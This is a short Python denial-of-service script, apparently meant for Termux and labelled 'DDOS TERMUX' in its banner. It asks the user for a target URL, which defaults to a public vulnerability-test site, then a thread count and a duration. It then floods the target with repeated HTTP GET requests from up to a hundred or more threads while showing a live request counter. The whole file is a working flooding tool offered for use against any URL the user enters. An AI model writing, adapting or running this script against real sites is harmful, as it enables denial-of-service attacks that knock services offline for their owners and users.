#!/usr/bin/env python3
import requests
import threading
import time
import sys

print("🔥 DDOS TERMUX - TEGUH GANTENG")
print("="*40)

# Target default
target = "http://testphp.vulnweb.com"

# Tanya user
user_target = input(f"Target [{target}]: ").strip()
if user_target:
    target = user_target

# Threads
try:
    threads = int(input("Threads [100]: ") or "100")
except:
    threads = 100

# Duration
try:
    duration = int(input("Duration seconds [60]: ") or "60")
except:
    duration = 60

print(f"\n[🚀] Starting attack on: {target}")
print(f"[⚡] Threads: {threads}")
print(f"[⏱️] Duration: {duration}s")
print("[📊] Press CTRL+C to stop\n")

attack_active = True
request_count = 0

def attack():
    global request_count
    while attack_active:
        try:
            requests.get(target, timeout=3)
            request_count += 1
        except:
            pass
        time.sleep(0.01)

# Start threads
for i in range(threads):
    t = threading.Thread(target=attack)
    t.daemon = True
    t.start()

# Run for duration
try:
    start_time = time.time()
    while time.time() - start_time < duration:
        elapsed = int(time.time() - start_time)
        remaining = duration - elapsed
        print(f"\r[🟢] Attacking... {elapsed}s/{duration}s | Requests: {request_count}", end="")
        time.sleep(1)
except KeyboardInterrupt:
    print("\n[🛑] Stopped by user")

attack_active = False
time.sleep(2)

print(f"\n[✅] Finished!")
print(f"[📊] Total requests: {request_count}")
